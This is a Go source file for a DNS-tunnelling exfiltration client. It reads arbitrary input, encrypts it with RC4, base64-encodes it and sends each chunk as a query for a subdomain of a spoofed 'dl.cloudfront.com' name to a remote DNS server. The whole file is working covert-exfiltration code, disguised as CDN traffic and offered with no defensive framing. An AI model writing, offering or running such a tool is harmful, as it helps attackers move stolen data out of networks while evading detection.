package main

import (
	"github.com/miekg/dns"
	"io"
	"crypto/rc4"
	"encoding/base64"
	//"fmt"
	"strings"
)

func client(src io.Reader, remote, secret string) {

	// set up the new rc4 cipher
	cipher, err := rc4.NewCipher([]byte(secret))
	if err != nil {
		panic(err)
	}

	// loop through all data to send
	for {
		// text buffer to store input
		text := make([]byte, 32)

		// read data from source
		n, err := src.Read(text)
		if n == 0 {
			break
		}
		if err != nil && err != io.EOF {
			panic(err)
		}

		// encrypt the data (dst, src)
		cipher.XORKeyStream(text, text[:n])
		//fmt.Printf("Encrypting %v bytes\n", n)

		// encode the data (dst, src)
		encoded := base64.StdEncoding.EncodeToString(text[:n])

		// trim the non-domain standard '='
		encoded = strings.TrimRight(encoded, "=")
		// padding will be re-added at the receiving end

		//fmt.Println("Encoded:")
		//fmt.Println(encoded)

		// send it via dns request
		dnssend(encoded, remote)

	}
}

func dnssend(msg, remote string) {

	// create a new dns query message
	dnsMessage := new(dns.Msg)

	// embedd message in url
	msg += ".dl.cloudfront.com"

	// set the question (auto creates a RR)
	dnsMessage.SetQuestion(dns.Fqdn(msg), dns.TypeA)

	//fmt.Println("Sending request")
	//fmt.Println(dnsMessage)

	// send and wait on response (syncronous)
	_, err := dns.Exchange(dnsMessage, remote + ":53")

	if err != nil {
		panic(err)
	}
}
